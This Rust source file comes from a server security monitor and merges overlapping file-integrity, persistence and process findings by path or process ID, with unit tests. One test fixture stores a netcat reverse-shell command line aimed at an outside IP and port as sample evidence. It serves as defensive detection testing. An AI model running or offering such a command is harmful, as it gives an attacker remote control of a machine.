use sentinel_core::{Evidence, Finding};
use std::collections::{BTreeMap, BTreeSet};

const RESOURCE_MERGE_DEDUP_KEYS: &[&str] = &["path", "change", "current_hash"];
const PROCESS_MERGE_DEDUP_KEYS: &[&str] = &["exe_path", "cmdline", "name"];

/// Coalesce findings that describe the same underlying resource or runtime entity.
///
/// Detectors intentionally stay independent, so a systemd unit change can be
/// recognized by both file-integrity and persistence detectors, and one process
/// can have several risk signals. This pass keeps detection modular while
/// preventing users from receiving several messages for one underlying object.
pub(crate) fn coalesce_related_findings(findings: Vec<Finding>) -> Vec<Finding> {
    let mut resource_groups = BTreeMap::<String, Vec<Finding>>::new();
    let mut process_groups = BTreeMap::<String, Vec<Finding>>::new();
    let mut retained = Vec::new();

    for finding in findings {
        if is_file_persistence_drift(&finding) {
            resource_groups
                .entry(resource_group_key(&finding))
                .or_default()
                .push(finding);
        } else if is_process_signal(&finding) {
            process_groups
                .entry(process_group_key(&finding))
                .or_default()
                .push(finding);
        } else {
            retained.push(finding);
        }
    }

    retained.extend(resource_groups.into_values().map(merge_resource_findings));
    retained.extend(process_groups.into_values().map(merge_process_findings));
    retained
}

fn is_file_persistence_drift(finding: &Finding) -> bool {
    matches!(
        finding.rule_id.as_str(),
        "FILE-001" | "PERSIST-001" | "PERSIST-003"
    )
}

fn resource_group_key(finding: &Finding) -> String {
    format!("{}\n{}", finding.host_id, finding.subject)
}

fn process_group_key(finding: &Finding) -> String {
    let pid = finding
        .evidence
        .iter()
        .find(|item| item.key == "pid" && !item.value.trim().is_empty())
        .map(|item| item.value.as_str())
        .unwrap_or(&finding.subject);
    format!("{}\n{}", finding.host_id, pid)
}

fn is_process_signal(finding: &Finding) -> bool {
    matches!(
        finding.rule_id.as_str(),
        "PROC-001" | "PROC-002" | "PROC-003" | "PROC-004" | "PROC-005"
    )
}

fn merge_resource_findings(mut findings: Vec<Finding>) -> Finding {
    if findings.len() == 1 {
        return findings.remove(0);
    }

    findings.sort_by_key(|finding| rule_priority(&finding.rule_id));
    let mut primary = findings.remove(0);
    let evidence = merge_evidence(&primary, &findings);
    primary = primary.with_evidence_deduped_by(evidence, RESOURCE_MERGE_DEDUP_KEYS);
    primary.impact = merge_text_lists(std::iter::once(&primary).chain(findings.iter()), |item| {
        &item.impact
    });
    primary.recommendations =
        merge_text_lists(std::iter::once(&primary).chain(findings.iter()), |item| {
            &item.recommendations
        });
    primary
}

fn merge_process_findings(mut findings: Vec<Finding>) -> Finding {
    if findings.len() == 1 {
        return findings.remove(0);
    }

    findings.sort_by_key(|finding| process_rule_priority(&finding.rule_id));
    let mut primary = findings.remove(0);
    let evidence = merge_process_evidence(&primary, &findings);
    primary = primary.with_evidence_deduped_by(evidence, PROCESS_MERGE_DEDUP_KEYS);
    primary.impact = merge_text_lists(std::iter::once(&primary).chain(findings.iter()), |item| {
        &item.impact
    });
    primary.recommendations =
        merge_text_lists(std::iter::once(&primary).chain(findings.iter()), |item| {
            &item.recommendations
        });
    primary
}

fn rule_priority(rule_id: &str) -> u8 {
    match rule_id {
        "PERSIST-003" => 0,
        "PERSIST-001" => 1,
        "FILE-001" => 2,
        _ => 10,
    }
}

fn process_rule_priority(rule_id: &str) -> u8 {
    match rule_id {
        "PROC-003" => 0,
        "PROC-004" => 1,
        "PROC-002" => 2,
        "PROC-005" => 3,
        "PROC-001" => 4,
        _ => 10,
    }
}

fn merge_evidence(primary: &Finding, related: &[Finding]) -> Vec<Evidence> {
    let mut path = first_evidence_value(primary, related, "path");
    if path.is_empty() {
        path = primary.subject.clone();
    }

    let mut evidence = vec![
        Evidence::new("path", path),
        Evidence::new("signals", signal_names(primary, related).join(", ")),
    ];
    push_first_evidence(&mut evidence, primary, related, "type");
    push_joined_evidence(&mut evidence, primary, related, "change");
    push_first_evidence(&mut evidence, primary, related, "previous_hash");
    push_first_evidence(&mut evidence, primary, related, "current_hash");
    push_first_evidence(&mut evidence, primary, related, "package_activity_recent");
    push_joined_evidence(&mut evidence, primary, related, "package_activity_sources");
    evidence
}

fn merge_process_evidence(primary: &Finding, related: &[Finding]) -> Vec<Evidence> {
    let mut evidence = Vec::new();
    for key in [
        "pid",
        "ppid",
        "name",
        "parent_name",
        "exe_path",
        "cmdline",
        "cwd",
        "euid",
        "exe_uid",
        "exe_gid",
        "exe_size",
        "exe_hash_blake3",
        "package_owner",
        "systemd_unit",
        "systemd_execstart",
        "container_context",
        "socket_fd_count",
        "cpu_percent",
        "cpu_total_seconds",
        "process_age_seconds",
        "outbound_connection_count",
        "public_outbound_count",
        "outbound_remote_ports",
        "package_activity_recent",
    ] {
        push_first_evidence(&mut evidence, primary, related, key);
    }
    evidence.push(Evidence::new(
        "signals",
        process_signal_names(primary, related).join(", "),
    ));
    if let Some(score) = max_numeric_evidence(primary, related, "risk_score") {
        evidence.push(Evidence::new("risk_score", score.to_string()));
    }
    push_joined_evidence(&mut evidence, primary, related, "risk_reasons");
    push_joined_evidence(&mut evidence, primary, related, "risk_features");
    evidence
}

fn signal_names(primary: &Finding, related: &[Finding]) -> Vec<&'static str> {
    let mut signals = BTreeSet::new();
    for finding in std::iter::once(primary).chain(related.iter()) {
        match finding.rule_id.as_str() {
            "FILE-001" => {
                signals.insert("file integrity");
            }
            "PERSIST-001" | "PERSIST-003" => {
                signals.insert("persistence");
            }
            _ => {}
        }
    }
    signals.into_iter().collect()
}

fn process_signal_names(primary: &Finding, related: &[Finding]) -> Vec<&'static str> {
    let mut signals = BTreeSet::new();
    for finding in std::iter::once(primary).chain(related.iter()) {
        match finding.rule_id.as_str() {
            "PROC-001" => {
                signals.insert("temporary path");
            }
            "PROC-002" => {
                signals.insert("deleted executable");
            }
            "PROC-003" => {
                signals.insert("network execution bridge");
            }
            "PROC-004" => {
                signals.insert("miner or scanner indicator");
            }
            "PROC-005" => {
                signals.insert("behavior cluster");
            }
            _ => {}
        }
    }
    signals.into_iter().collect()
}

fn first_evidence_value(primary: &Finding, related: &[Finding], key: &str) -> String {
    std::iter::once(primary)
        .chain(related.iter())
        .flat_map(|finding| finding.evidence.iter())
        .find(|item| item.key == key && !item.value.trim().is_empty())
        .map(|item| item.value.clone())
        .unwrap_or_default()
}

fn push_first_evidence(
    evidence: &mut Vec<Evidence>,
    primary: &Finding,
    related: &[Finding],
    key: &str,
) {
    let value = first_evidence_value(primary, related, key);
    if !value.is_empty() {
        evidence.push(Evidence::new(key, value));
    }
}

fn push_joined_evidence(
    evidence: &mut Vec<Evidence>,
    primary: &Finding,
    related: &[Finding],
    key: &str,
) {
    let values = unique_evidence_values(primary, related, key);
    if !values.is_empty() {
        evidence.push(Evidence::new(key, values.join(", ")));
    }
}

fn unique_evidence_values(primary: &Finding, related: &[Finding], key: &str) -> Vec<String> {
    let mut values = BTreeSet::new();
    for finding in std::iter::once(primary).chain(related.iter()) {
        for item in &finding.evidence {
            if item.key == key && !item.value.trim().is_empty() {
                values.insert(item.value.clone());
            }
        }
    }
    values.into_iter().collect()
}

fn max_numeric_evidence(primary: &Finding, related: &[Finding], key: &str) -> Option<u16> {
    std::iter::once(primary)
        .chain(related.iter())
        .flat_map(|finding| finding.evidence.iter())
        .filter(|item| item.key == key)
        .filter_map(|item| item.value.parse::<u16>().ok())
        .max()
}

fn merge_text_lists<'a>(
    findings: impl Iterator<Item = &'a Finding>,
    select: impl Fn(&'a Finding) -> &'a Vec<String>,
) -> Vec<String> {
    let mut seen = BTreeSet::new();
    let mut merged = Vec::new();
    for finding in findings {
        for item in select(finding) {
            if seen.insert(item.clone()) {
                merged.push(item.clone());
            }
        }
    }
    merged
}

#[cfg(test)]
mod tests {
    use super::coalesce_related_findings;
    use sentinel_core::{Category, Evidence, Finding, Severity};

    #[test]
    fn coalesces_file_and_persistence_findings_for_same_path() {
        let findings = coalesce_related_findings(vec![
            finding("FILE-001", Category::FileIntegrity),
            finding("PERSIST-001", Category::Persistence),
        ]);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "PERSIST-001");
        assert!(findings[0]
            .evidence
            .iter()
            .any(|item| item.key == "signals" && item.value == "file integrity, persistence"));
    }

    #[test]
    fn coalesced_drift_keeps_package_activity_context() {
        let mut file = finding("FILE-001", Category::FileIntegrity);
        file.evidence
            .push(Evidence::new("package_activity_recent", "true"));
        file.evidence.push(Evidence::new(
            "package_activity_sources",
            "/var/log/dpkg.log",
        ));
        let findings =
            coalesce_related_findings(vec![file, finding("PERSIST-001", Category::Persistence)]);

        assert_eq!(findings.len(), 1);
        assert!(findings[0]
            .evidence
            .iter()
            .any(|item| item.key == "package_activity_recent" && item.value == "true"));
    }

    #[test]
    fn coalesces_process_findings_for_same_pid() {
        let findings = coalesce_related_findings(vec![
            process_finding("PROC-001", Severity::High, "/tmp/.x/sh"),
            process_finding("PROC-003", Severity::Critical, "42").with_evidence(vec![
                Evidence::new("pid", "42"),
                Evidence::new("ppid", "1"),
                Evidence::new("name", "sh"),
                Evidence::new("parent_name", "systemd"),
                Evidence::new("exe_path", "/tmp/.x/sh"),
                Evidence::new("cmdline", "sh -c nc -e /bin/sh 1.2.3.4 4444"),
                Evidence::new("systemd_unit", "x.service"),
                Evidence::new("exe_hash_blake3", "abc123"),
                Evidence::new("public_outbound_count", "1"),
                Evidence::new("risk_score", "120"),
                Evidence::new("risk_reasons", "network execution bridge"),
                Evidence::new("risk_features", "fd_bridge"),
            ]),
        ]);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "PROC-003");
        assert!(findings[0].evidence.iter().any(|item| item.key == "signals"
            && item.value.contains("network execution bridge")
            && item.value.contains("temporary path")));
        assert!(findings[0]
            .evidence
            .iter()
            .any(|item| item.key == "risk_score" && item.value == "120"));
        for key in [
            "parent_name",
            "systemd_unit",
            "exe_hash_blake3",
            "public_outbound_count",
        ] {
            assert!(
                findings[0].evidence.iter().any(|item| item.key == key),
                "missing merged evidence key {key}"
            );
        }
    }

    #[test]
    fn coalesces_process_findings_by_pid_evidence_when_subjects_differ() {
        let findings = coalesce_related_findings(vec![
            process_finding("PROC-001", Severity::High, "/tmp/.x/sh"),
            process_finding("PROC-005", Severity::High, "42"),
        ]);

        assert_eq!(findings.len(), 1);
        assert!(findings[0].evidence.iter().any(|item| item.key == "signals"
            && item.value.contains("temporary path")
            && item.value.contains("behavior cluster")));
    }

    #[test]
    fn keeps_unrelated_file_findings_separate() {
        let mut other = finding("PERSIST-001", Category::Persistence);
        other.subject = "/etc/systemd/system/other.service".to_string();
        let findings =
            coalesce_related_findings(vec![finding("FILE-001", Category::FileIntegrity), other]);
        assert_eq!(findings.len(), 2);
    }

    fn finding(rule_id: &str, category: Category) -> Finding {
        Finding::new(
            "host",
            "changed",
            "changed",
            Severity::High,
            category,
            rule_id,
            "/etc/systemd/system/vps-sentinel.service",
        )
        .with_evidence(vec![
            Evidence::new("path", "/etc/systemd/system/vps-sentinel.service"),
            Evidence::new("change", "file_created"),
            Evidence::new("previous_hash", ""),
            Evidence::new("current_hash", "abc"),
        ])
    }

    fn process_finding(rule_id: &str, severity: Severity, subject: &str) -> Finding {
        Finding::new(
            "host",
            "process",
            "process",
            severity,
            Category::Process,
            rule_id,
            subject,
        )
        .with_evidence(vec![
            Evidence::new("pid", "42"),
            Evidence::new("ppid", "1"),
            Evidence::new("name", "sh"),
            Evidence::new("exe_path", "/tmp/.x/sh"),
            Evidence::new("cmdline", "/tmp/.x/sh"),
        ])
    }
}
